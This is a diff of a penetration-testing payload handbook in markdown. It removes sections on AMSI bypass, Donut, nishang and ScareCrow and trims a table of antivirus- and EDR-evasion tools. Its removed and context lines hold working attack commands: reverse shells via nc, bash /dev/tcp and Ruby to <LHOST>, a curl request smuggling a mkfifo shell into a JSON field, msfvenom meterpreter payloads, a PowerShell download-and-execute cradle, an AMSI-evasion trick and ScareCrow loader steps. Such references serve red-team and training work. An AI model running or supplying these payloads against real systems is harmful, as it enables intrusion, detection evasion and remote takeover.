@@ -3,10 +3,8 @@
 ## Table of Contents
 
 - [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Resources)
-- [AMSI](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#AMSI)
 - [Bash Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bash-Reverse-Shell)
 - [curl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#curl-Reverse-Shell)
-- [Donut](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Donut)
 - [Exiftool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Exiftool)
 - [GhostScript](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#GhostScript)
 - [GIF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#GIF)
@@ -19,7 +17,6 @@
 - [mkfifo Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#mkfifo-Reverse-Shell)
 - [msfvenom](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#msfvenom)
 - [Netcat Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Netcat-Reverse-Shell)
-- [nishang](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#nishang)
 - [PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PDF)
 - [Perl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Perl-Reverse-Shell)
 - [PHP Web Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#PHP-Web-Shell)
@@ -27,7 +24,6 @@
 - [Python Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Python-Reverse-Shell)
 - [Remote File Inclusion (RFI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Remote-File-Inclusion-RFI)
 - [Ruby Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Ruby-Reverse-Shell)
-- [ScareCrow](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#ScareCrow)
 - [SMB .scf-File](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#SMB-scf-File)
 - [Spoofing Office Marco](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Spoofing-Office-Macro)
 - [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Server-Side-Template-Injection-SSTI)
@@ -39,49 +35,18 @@
 
 | Name | Description | URL |
 | --- | --- | --- |
-| AMSI Bypass Powershell | This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts. | https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell |
-| AMSI.fail | AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. | http://amsi.fail |
-| AmsiHook | AmsiHook is a project I created to figure out a bypass to AMSI via function hooking. | https://github.com/tomcarver16/AmsiHook |
-| AmsiScanBufferBypass | Bypass AMSI by patching AmsiScanBuffer | https://github.com/rasta-mouse/AmsiScanBufferBypass |
-| charlotte | c++ fully undetected shellcode launcher ;) | https://github.com/9emin1/charlotte |
 | Chimera | Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions. | https://github.com/tokyoneon/Chimera |
-| DefenderCheck | Identifies the bytes that Microsoft Defender flags on. | https://github.com/matterpreter/DefenderCheck |
-| Donut | Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. | https://github.com/TheWover/donut |
-| EDRSandBlast | EDRSandBlast is a tool written in C that weaponize a vulnerable signed driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks and ETW TI provider) and LSASS protections. | https://github.com/wavestone-cdt/EDRSandblast |
 | EXE_to_DLL | Converts a EXE into DLL | https://github.com/hasherezade/exe_to_dll |
-| Freeze | Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods | https://github.com/optiv/Freeze |
 | GadgetToJScript | A tool for generating .NET serialized gadgets that can trigger .NET assembly load/execution when deserialized using BinaryFormatter from JS/VBS/VBA based scripts. | https://github.com/med0x2e/GadgetToJScript |
 | hoaxshell | An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic. | https://github.com/t3l3machus/hoaxshell |
 | Intruder Payloads | A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists. | https://github.com/1N3/IntruderPayloads |
-| Invoke-Obfuscation | PowerShell Obfuscator | https://github.com/danielbohannon/Invoke-Obfuscation |
-| macro_pack | macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for pentest, demo, and social engineering assessments. | https://github.com/sevagas/macro_pack |
 | marshalsec | Java Unmarshaller Security | https://github.com/mbechler/marshalsec |
-| mimikatz Obfuscator | This script downloads and slightly "obfuscates" the mimikatz project. | https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781 |
-| Mortar Loader | Evasion technique to defeat and divert detection and prevention of security products (AV/EDR/XDR) | https://github.com/0xsp-SRD/mortar |
-| NetLoader | Loads any C# binary in mem, patching AMSI + ETW. | https://github.com/Flangvik/NetLoader |
-| Nimcrypt2 | .NET, PE, & Raw Shellcode Packer/Loader Written in Nim | https://github.com/icyguider/Nimcrypt2 |
-| NimHollow | Nim implementation of Process Hollowing using syscalls (PoC) | https://github.com/snovvcrash/NimHollow |
-| NimlineWhisperer2 | A tool for converting SysWhispers2 syscalls for use with Nim projects | https://github.com/ajpc500/NimlineWhispers2 |
-| nim-strenc | A tiny library to automatically encrypt string literals in Nim code | https://github.com/Yardanico/nim-strenc |
-| nishang | Offensive PowerShell for red team, penetration testing and offensive security. | https://github.com/samratashok/nishang |
-| ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
-| Obfuscator-LLVM | The aim of this project is to provide an open-source fork of the LLVM compilation suite able to provide increased software security through code obfuscation and tamper-proofing. | https://github.com/obfuscator-llvm/obfuscator |
-| Offensive-C-Sharp | I wrote these while learning AD Pentesting and windows hacking | https://github.com/winsecurity/Offensive-C-Sharp |
-| OffensiveNim | Experiments in weaponizing Nim for implant development and general offensive operations. | https://github.com/0xsyr0/OffensiveNim |
-| OffensivePipeline | OffensivePipeline allows to download, compile (without Visual Studio) and obfuscate C# tools for Red Team exercises.  | https://github.com/Aetsu/OffensivePipeline |
-| OffensiveRust | Rust Weaponization for Red Team Engagements. | https://github.com/trickster0/OffensiveRust |
 | Payload Box | Payload Collection | https://github.com/payloadbox |
 | PayloadsAllTheThings | A list of useful payloads and bypass for Web Application Security and Pentest/CTF. | https://github.com/swisskyrepo/PayloadsAllTheThings |
 | phpgcc | PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. | https://github.com/ambionics/phpggc |
 | PHP-Reverse-Shell | PHP shells that work on Linux OS, macOS, and Windows OS. | https://github.com/ivan-sincek/php-reverse-shell |
 | PSByPassCLM | Bypass for PowerShell Constrained Language Mode | https://github.com/padovah4ck/PSByPassCLM |
-| Raikia's Hub | Online repository for Red Teamers | https://raikia.com/tool-powershell-encoder/ |
-| ScareCrow | Payload creation framework designed around EDR bypass. | https://github.com/optiv/ScareCrow |
 | SharpPyShell | SharPyShell - tiny and obfuscated ASP.NET webshell for C# web applications | https://github.com/antonioCoco/SharPyShell |
-| Shikata Ga Nai | Shikata ga nai (仕方がない) encoder ported into go with several improvements. | https://github.com/EgeBalci/sgn |
-| Simple Injector | A simple injector that uses LoadLibraryA | https://github.com/tomcarver16/SimpleInjector |
-| SysWhispers | SysWhispers helps with evasion by generating header/ASM files implants can use to make direct system calls. | https://github.com/m57/SysWhispers |
-| TreatCheck | Identifies the bytes that Microsoft Defender / AMSI Consumer flags on. | https://github.com/rasta-mouse/ThreatCheck |
 | unicorn | Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. Based on Matthew Graeber's powershell attacks and the powershell bypass technique presented by David Kennedy (TrustedSec) and Josh Kelly at Defcon 18. | https://github.com/trustedsec/unicorn |
 | Veil | Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. | https://github.com/Veil-Framework/Veil |
 | webshell | This is a webshell open source project | https://github.com/tennc/webshell |
@@ -90,20 +55,6 @@
 | woodpecker | Log4j jndi injects the Payload generator | https://github.com/woodpecker-appstore/log4j-payload-generator |
 | ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |
 | ysoserial.net | Deserialization payload generator for a variety of .NET formatters | https://github.com/pwntester/ysoserial.net |
-
-## AMSI
-
-### Test String
-
-```c
-PS C:\> $str = 'amsiinitfailed'
-```
-
-### Bypass
-
-```c
-PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
-```
 
 ## Bash Reverse Shell
 
@@ -123,24 +74,6 @@ $ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<
 
 ```c
 $ curl -i -s -k -X $'POST' -H $'Host: api.<RHOST>' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzIyMjk2LCJleHAiOjE2MzI5MTQyOTZ9.y8GGfvwe1LPGOGJUVjmzMIsZaR5aok60X6fmEnAHvMg' -H $'Content-Type: application/json' -H $'Origin: http://api.<RHOST>' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)\",\"port\":\"1337\"\}' $'http://api.<RHOST>/admin/plugins/install' --proxy http://127.0.0.1:8080
-```
-
-## Donut
-
-> https://github.com/TheWover/donut
-
-### Installation
-
-```c
-$ make
-$ make clean
-$ make debug
-```
-
-### Obfuscation
-
-```c
-$ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
 ```
 
 ## Exiftool
@@ -306,30 +239,6 @@ $ msfvenom -p windows/meterpreter/reverse_http LHOST=<LHOST> LPORT=<LPORT> HttpU
 $ nc -e /bin/sh <LHOST> <LPORT>
 ```
 
-## nishang
-
-> https://github.com/samratashok/nishang
-
-### Reverse-TCP Shell for Windows
-
-```c
-$ cd PATH/TO/nishang/Shells/
-$ cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
-```
-
-Choose which variant you require, copy and put it at the end of the file.
-
-```c
-tail -3 Invoke-PowerShellTcp.ps1 
-}
-
-Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>
-```
-
-```c
-C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1')"
-```
-
 ## PDF
 
 ### Magic Bytes
@@ -488,70 +397,6 @@ exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
 ```c
 $ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
-
-## ScareCrow
-
-> https://github.com/optiv/ScareCrow
-
-### Payloads
-
-#### Shellcode Payload Creation with msfvenom
-
-```c
-$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
-```
-
-#### .msi-File Payload Creation with msfvenom
-
-```c
-$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
-```
-
-### Listener
-
-```c
-msf6 > use exploit/multi/handler
-msf6 > set payload windows/x64/meterpreter/reverse_https
-```
-
-### Obfuscation
-
-#### DLL Side-Loading
-
-```c
-$ ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
-```
-#### Windows Script Host
-
-```c
-$ ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
-```
-
-#### Control Panel Files
-
-```c
-$ ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
-```
-
-### Renaming Payload
-
-```c
-$ mv <FILE>.dll <FILE>32.dll
-```
-
-### Execution
-
-```c
-PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
-```
-
-or
-
-```c
-PS C:\> regsvr32 /s .\<FILE>32.dll
-```
-
-For `.cpl-Files` a simple double click is enough to execute them.
 
 ## SMB .scf-File
 
